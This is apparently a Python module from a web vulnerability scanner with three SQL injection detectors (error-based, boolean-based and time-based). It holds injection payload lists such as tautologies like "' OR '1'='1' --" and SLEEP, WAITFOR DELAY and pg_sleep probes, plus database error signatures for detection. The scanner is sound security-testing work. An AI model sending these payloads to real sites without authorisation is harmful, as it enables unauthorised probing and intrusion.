
import re, random, string
from core.scanner.module import *
from urllib.parse import quote, quote_plus
from html import escape


class SQLiErrorBased( ParamsScanner ):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "SQL Injection",
        "Description": 'The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://owasp.org/www-community/attacks/SQL_Injection"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)
        self.AppendPayloadToDefaultValue()

    def GetPayloads(self):
        return [
            "'",
            "`",
            "\"",
            "'\"",
            "\"'",
            "(",
            "'(",
            ")",
            "NULL",
            ";",
            "[]"
        ]

    def is_vulnerable(self, res) -> Status:

        expected_errors = [
            "Fatal error:","mysql_fetch_array()","Warning: mysql_fetch_array()", "MySqlException", 
            "quoted string not properly terminated.","MariaDB","SQL syntax","Syntax error",
            "You have an error in your SQL syntax","Unclosed quotation mark after the character string",
            "MemSQL does not support this type of query", "is not supported by MemSQL", "unsupported nested scalar subselect",
            "valid PostgreSQL result", "ERROR: parser: parse error at or near", "PostgreSQL query failed", "PSQLException",
            "Microsoft SQL Native Client error", "ODBC SQL Server Driver", "SQLServer JDBC Driver", "SQLSrvException", "SQLServerException",
            "Zend_Db_Adapter_Sqlsrv_Exception", "Zend_Db_Statement_Sqlsrv_Exception", "Unclosed quotation mark after the character string",
            "JET Database Engine", "Access Database Engine", "ODBC Microsoft Access", 
            "ORA-01756:", "Oracle error", "quoted string not properly terminated", "SQL command not properly ended", 
            "Zend_Db_Adapter_Oracle_Exception", "Zend_Db_Statement_Oracle_Exception", "OracleException",
            "DB2 SQL error", "Zend_Db_Adapter_Db2_Exception", "Zend_Db_Statement_Db2_Exception", "DB2Exception",
            "Informix ODBC Driver", "ODBC Informix driver", "IfxException",
            "Dynamic SQL Error",
            "SQLite error", "sqlite3.OperationalError:", "SQLite3::SQLException", "SQLiteException",
            "DriverSapDB", "Invalid end of SQL statement", "Invalid keyword or missing delimiter",
            "Sybase message", "SybSQLException", "Ingres SQLSTATE", "Semantic error",
            "Unexpected end of command in statement", "Unexpected token", "encountered after end of query",
            "A comparison operator is required here", "-10048: Syntax error",
            "SQ074: Line ", "SR185: Undefined procedure", "SQ200: No table", "Virtuoso S0002 Error"
        ]

        for err in expected_errors:
            if err in res.text:
                return Status.Vulnerable

        return Status.NotVulnerable


class SQLiBooleanBased( ParamsScanner ):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "SQL Injection",
        "Description": 'The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://owasp.org/www-community/attacks/SQL_Injection"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)
        self.AppendPayloadToDefaultValue()

        endpoint = self.DeepCloneEndpoint()
        self.orgResponse = self.send_request( endpoint )
        self.orgRespStripped = self.strip( self.orgResponse.text, endpoint.GetAllParams() ) if self.orgResponse else ""


    def check(self):
        if ParamsScanner.check( self ):
            endpoint = self.DeepCloneEndpoint()
            self.change_defaults( endpoint ) # Change default params values
            self.newResponse = self.send_request( endpoint )
            if not ( self.newResponse and self.orgResponse ): return False
            self.newRespStripped = self.strip(self.newResponse.text, endpoint.GetAllParams())
            
            return self.newResponse.ok and self.orgResponse.ok and \
                ( self.newRespStripped == self.orgRespStripped or \
                self.percent_response_change( self.orgRespStripped, self.newRespStripped ) in range( 40 ) )

        return False


    def GetPayloads(self) -> list:
        return [
            " AND 1=1 -- ",
            " OR 1=1 --",
            " AND 1=1",
            " AND 1=2",
            "' AND '1'='1' -- ",
            "admin' OR '1'='1' -- ",
            "' OR '1'='1' --",
            "' AND '1'='2' -- ",
            "\" AND \"1\"=\"1\"",
            "\" AND \"1\"=\"2\"",
            "\" AND \"1\"=\"1",
            "\" AND \"1\"=\"2",
            "' AND '1'='1"
        ]

    def is_vulnerable(self, response) -> Status:
        
        endpoint = self.GetEndPoint()
        params = endpoint.GetAllParams()
        injRespBody = response.text
        injStripped = self.strip( injRespBody, params )
        
        if response.ok and self.orgRespStripped != injStripped:
            change_percentage = self.percent_response_change( self.orgRespStripped, injStripped )

            if change_percentage not in range( 5 ):
                return Status.Maybe

        return Status.NotVulnerable

    def strip(self, res, params):
        result = res
        values = [v for _, v in params.items()]
        values += self.GetPayloads()

        for v in values:
            urlEncoded = quote( v )
            urlEncodedPlus = quote_plus( v )
            htmlEncoded = escape( v )
            htmlEncodedFromUrlEncoded = escape( urlEncoded )
            htmlEncodedFromUrlEncodedPlus = escape( urlEncodedPlus )
            result = self.neutralize( result, v )
            result = self.neutralize( result, urlEncoded )
            result = self.neutralize( result, urlEncodedPlus )
            result = self.neutralize( result, htmlEncoded )
            result = self.neutralize( result, htmlEncodedFromUrlEncoded )
            result = self.neutralize( result, htmlEncodedFromUrlEncodedPlus )

        return result

    def neutralize(self, res, pattern):
        return re.compile( re.escape(pattern) ).sub( "", res )

    def change_defaults(self, endpoint):
        for param in endpoint.GetAllParamNames():
            ptype = endpoint.GetParamTypeByName( param )

            if ptype == "submit":
                continue

            value = endpoint.GetParamValueByName( param )
            
            if value.isdigit():
                value = str( int(value) + 1 )

            else:
                valLen = len(value)
                valLen = random.randint(1, 8) if valLen == 0 else valLen
                value = ''.join(random.choice(string.ascii_letters) for _ in range(valLen))

            endpoint.SetParam(param, value)


    def send_request(self, endpoint, **args):
        try:
            requester = self.GetRequester( endpoint )
            return requester.Send( **args )
        except:
            return None

    def percent_response_change(self, orgResBody, newResBody):
        orgBodyLen = len( orgResBody )
        newBodyLen = len( newResBody )
        maxLen = max( orgBodyLen, newBodyLen )
        if orgBodyLen == newBodyLen: return 0
        if maxLen == 0: return -1
        len_chg_per =  self.percent_resplen_change( orgBodyLen, newBodyLen )
        if len_chg_per not in range( 5 ): return len_chg_per
        distance = helper.levenshtein_distance(orgResBody, newResBody)
        return round( distance / abs(maxLen) * 100 )

    def percent_resplen_change(self, orgBodyLen, newBodyLen):
        maxLen = max( orgBodyLen, newBodyLen )
        minLen = min( orgBodyLen, newBodyLen )
        return round( (maxLen - minLen) / abs(maxLen) * 100 )

    def levenshtein_distance(self, orgResBody, newResBody):
        orgBodyLen = len( orgResBody )
        newBodyLen = len( newResBody )
        smallerBodyLen = min( orgBodyLen, newBodyLen )
        smallerBodyRng = range( smallerBodyLen )

        largerBody = orgResBody if orgBodyLen > newBodyLen else newResBody
        smallerBody = newResBody if orgBodyLen > newBodyLen else orgResBody
        
        prev_row = list( range(smallerBodyLen + 1) )

        for idx1 in range( len(largerBody) ):
            curr_row = [ idx1 + 1 ] + [ 0 for _ in smallerBodyRng ]

            for idx2 in smallerBodyRng:
                curr_row[ idx2 + 1 ] = min(
                    prev_row[ idx2 + 1 ] + 1, # Insertions
                    curr_row[ idx2 ] + 1, # Deletions
                    prev_row[ idx2 ] + ( largerBody[idx1] != smallerBody[idx2] ) # Substitutions 
                )

            prev_row = curr_row

        return prev_row[ -1 ]


class SQLiTimeBased( ParamsScanner ):

    SLEEP_TIME = "8"

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "SQL Injection",
        "Description": 'The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://owasp.org/www-community/attacks/SQL_Injection"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)
        self.AppendPayloadToDefaultValue()

    def GetPayloads(self) -> list:
        return [
            f" or sleep({SQLiTimeBased.SLEEP_TIME})#",
            f" OR SLEEP({SQLiTimeBased.SLEEP_TIME})#",
            f"' or sleep({SQLiTimeBased.SLEEP_TIME})#",
            f"' OR SLEEP({SQLiTimeBased.SLEEP_TIME})#",
            f"ORDER BY SLEEP({SQLiTimeBased.SLEEP_TIME}) --",
            f"' ORDER BY SLEEP({SQLiTimeBased.SLEEP_TIME}) --",
            f";waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
            f");waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
            f"';waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
            f"\";waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
            f"\");waitfor delay '0:0:{SQLiTimeBased.SLEEP_TIME}'--",
            f" pg_sleep({SQLiTimeBased.SLEEP_TIME}) --",
            f" or pg_sleep({SQLiTimeBased.SLEEP_TIME}) --"
        ]

    def is_vulnerable(self, response) -> Status:
        if response.status_code == 504 or float(SQLiTimeBased.SLEEP_TIME) - 1 < response.elapsed.total_seconds() < float(SQLiTimeBased.SLEEP_TIME) + 2:
            return Status.Vulnerable

        elif response.elapsed.total_seconds() > float(SQLiTimeBased.SLEEP_TIME) + 2:
            return Status.Maybe

        return Status.NotVulnerable
            